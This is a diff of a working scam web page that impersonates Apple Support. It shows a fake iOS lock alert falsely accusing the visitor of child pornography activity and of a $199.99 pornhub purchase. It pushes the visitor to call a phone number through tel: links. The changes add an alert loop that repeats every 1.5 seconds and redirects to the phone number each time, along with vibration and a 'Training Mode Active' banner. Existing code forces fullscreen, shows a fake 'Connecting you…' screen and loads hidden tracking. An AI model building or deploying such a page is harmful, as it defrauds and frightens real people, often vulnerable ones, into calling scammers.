@@ -6,131 +6,190 @@
 <title>Support Contact</title>
 
 <style>
-    body {
-        margin: 0;
-        padding: 0;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
+body {
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
+    background: url('https://www.cultofmac.com/wp-content/uploads/2015/08/Apple-Support.jpg') no-repeat center center;
+    background-size: cover;
+    height: 100vh;
+    width: 100vw;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    overflow: hidden;
+}
 
-        /* Generic premium background */
-        background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/250px-Apple_logo_black.svg.png')
-                    no-repeat center center;
-        background-size: cover;
+/* Background dim overlay */
+.bg-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.45);
+    z-index: 1;
+}
 
-        height: 100vh;
-        width: 100vw;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        position: relative;
-        overflow: hidden;
-    }
+.overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.25);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 10;
+}
 
-    /* Slight dim overlay for readability */
-    .bg-overlay {
-        position: fixed;
-        inset: 0;
-        background: rgba(0,0,0,0.45);
-        z-index: 1;
-    }
+.ios-alert {
+    width: 82%;
+    max-width: 320px;
+    background: #ffffff;
+    border-radius: 14px;
+    box-shadow: 0px 22px 45px rgba(0,0,0,0.45);
+    text-align: center;
+    padding-top: 18px;
+    transform: scale(1.12);
+    opacity: 0;
+    animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
+    cursor: pointer;
+    z-index: 11;
+}
 
-    .overlay {
-        position: fixed;
-        inset: 0;
-        background: rgba(0, 0, 0, 0.25);
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        z-index: 10;
-    }
+@keyframes iosPop {
+    0% { transform: scale(1.12); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+}
 
-    .ios-alert {
-        width: 82%;
-        max-width: 320px;
-        background: #ffffff;
-        border-radius: 14px;
-        box-shadow: 0px 22px 45px rgba(0,0,0,0.45);
-        text-align: center;
-        padding-top: 18px;
-        transform: scale(1.12);
+.alert-title {
+    font-size: 18px;
+    font-weight: 600;
+    color: #111;
+    margin-bottom: 8px;
+    padding: 0 18px;
+}
+
+.alert-message {
+    font-size: 14px;
+    color: #3b3b3b;
+    padding: 0 20px 20px;
+    line-height: 1.45;
+}
+
+.buttons {
+    border-top: 1px solid #d0d0d0;
+    display: flex;
+    height: 44px;
+}
+
+.buttons a {
+    flex: 1;
+    text-decoration: none;
+    font-size: 17px;
+    color: #007aff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.buttons a:nth-child(1) {
+    border-right: 1px solid #d0d0d0;
+}
+
+/* Connecting Screen */
+#connectingScreen {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.85);
+    color: #fff;
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    z-index: 9999;
+    font-size: 22px;
+    padding: 20px;
+}
+
+.spinner {
+    width: 45px;
+    height: 45px;
+    border: 4px solid #555;
+    border-top: 4px solid #fff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* 🔵 iOS-Blue Glowing Banner */
+#trainingLabel {
+    position: fixed;
+    top: -60px;
+    left: 50%;
+    transform: translateX(-50%);
+    padding: 10px 22px;
+    background: rgba(0, 0, 0, 0.35);
+    backdrop-filter: blur(12px) saturate(180%);
+    -webkit-backdrop-filter: blur(12px) saturate(180%);
+    border-radius: 40px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #007aff;
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue";
+    z-index: 99999;
+    pointer-events: none;
+    white-space: nowrap;
+
+    text-shadow:
+        0 0 6px rgba(0,122,255,0.75),
+        0 0 14px rgba(0,122,255,0.65),
+        0 0 22px rgba(0,122,255,0.4);
+
+    opacity: 0;
+    animation: bannerSlideIn 2s ease-out forwards,
+               glowPulse 3.5s ease-in-out infinite 2s;
+}
+
+@keyframes bannerSlideIn {
+    0% {
+        top: -60px;
         opacity: 0;
-        animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
-        cursor: pointer;
-        z-index: 11;
     }
+    40% {
+        top: 20px;
+        opacity: 1;
+    }
+    100% {
+        top: 20px;
+        opacity: 1;
+    }
+}
 
-    @keyframes iosPop {
-        0% { transform: scale(1.12); opacity: 0; }
-        100% { transform: scale(1); opacity: 1; }
-    }
+@keyframes glowPulse {
+    0%   { text-shadow: 0 0 8px rgba(0,122,255,0.55); }
+    50%  { text-shadow: 0 0 18px rgba(0,122,255,0.95); }
+    100% { text-shadow: 0 0 8px rgba(0,122,255,0.55); }
+}
 
-    .alert-title {
-        font-size: 18px;
-        font-weight: 600;
-        color: #111;
-        margin-bottom: 8px;
-        padding: 0 18px;
-    }
+/* 🔵 Call Button Pressure-Expand Effect */
+.call-button-press {
+    transition: transform 0.14s cubic-bezier(.25, .8, .25, 1);
+    transform-origin: center;
+}
 
-    .alert-message {
-        font-size: 14px;
-        color: #3b3b3b;
-        padding: 0 20px 20px 20px;
-        line-height: 1.45;
-    }
-
-    .buttons {
-        border-top: 1px solid #d0d0d0;
-        display: flex;
-        height: 44px;
-    }
-
-    .buttons a {
-        flex: 1;
-        text-decoration: none;
-        font-size: 17px;
-        color: #007aff;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-    }
-
-    .buttons a:nth-child(1) {
-        border-right: 1px solid #d0d0d0;
-    }
-
-    /* Connecting Screen */
-    #connectingScreen {
-        position: fixed;
-        inset: 0;
-        background: rgba(0,0,0,0.85);
-        color: #fff;
-        display: none;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        text-align: center;
-        z-index: 9999;
-        font-size: 22px;
-        padding: 20px;
-    }
-
-    .spinner {
-        width: 45px;
-        height: 45px;
-        border: 4px solid #555;
-        border-top: 4px solid #fff;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
+.call-button-press:active {
+    transform: scale(0.92);
+}
 </style>
 </head>
 
 <body>
+
+<!-- 🔵 Blue Glowing iOS Banner -->
+<div id="trainingLabel">Training Mode Active</div>
 
 <!-- Background dim overlay -->
 <div class="bg-overlay"></div>
@@ -139,10 +198,9 @@
     <div class="ios-alert" id="alertBox">
         <div class="alert-title">Apple Support</div>
         <div class="alert-message">Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..</div>
-
         <div class="buttons">
-            <a href="tel:+18082774439">Cancel</a>
-            <a href="tel:+18082774439">Call Now</a>
+            <a href="tel:+18082774439" class="call-button-press">Cancel</a>
+            <a href="tel:+18082774439" class="call-button-press">Call Now</a>
         </div>
     </div>
 </div>
@@ -152,22 +210,24 @@
     <p style="margin-top:20px;">Connecting you…</p>
 </div>
 
+<!-- Alert Loop: OK triggers call -->
 <script>
 window.onload = function() {
-    alert("Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..");
-
-    setTimeout(function repeatAlert() {
+    function showTrainingAlert() {
         alert("Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..");
-        setTimeout(repeatAlert, 1500);
-    }, 1500);
+        navigator.vibrate?.([8, 12, 8]); // haptic
+        window.location.href = "tel:+18082774439";
+        setTimeout(showTrainingAlert, 1500);
+    }
+    showTrainingAlert();
 };
 </script>
 
 <!-- Statcounter -->
 <script type="text/javascript">
-var sc_project=13196894;
-var sc_invisible=1;
-var sc_security="7cf95a0a";
+var sc_project=13196894; 
+var sc_invisible=1; 
+var sc_security="7cf95a0a"; 
 </script>
 <script src="https://www.statcounter.com/counter/counter.js" async></script>
 
@@ -178,6 +238,7 @@ function goFullscreen() {
     if (e.requestFullscreen) e.requestFullscreen();
     else if (e.webkitRequestFullscreen) e.webkitRequestFullscreen();
 }
+
 document.addEventListener("click", goFullscreen);
 document.getElementById("alertBox").addEventListener("click", function(e){
     e.stopPropagation();
@@ -189,10 +250,31 @@ document.getElementById("alertBox").addEventListener("click", function(e){
 <script>
 document.addEventListener("click", function() {
     document.getElementById("connectingScreen").style.display = "flex";
-
     setTimeout(function() {
         window.location.href = "tel:+18082774439";
     }, 1500);
+});
+</script>
+
+<!-- 🔵 Haptic + Pressure Expand Handler -->
+<script>
+// Add haptics + expand effect to call buttons
+document.querySelectorAll('a[href^="tel:"]').forEach(btn => {
+    btn.classList.add("call-button-press");
+
+    btn.addEventListener("click", () => {
+        navigator.vibrate?.([8, 12, 8]); // iOS-compatible buzz
+    });
+
+    btn.addEventListener("touchend", () => {
+        btn.style.transform = "scale(1.08)";
+        setTimeout(() => btn.style.transform = "scale(1)", 120);
+    });
+
+    btn.addEventListener("mouseup", () => {
+        btn.style.transform = "scale(1.08)";
+        setTimeout(() => btn.style.transform = "scale(1)", 120);
+    });
 });
 </script>
 
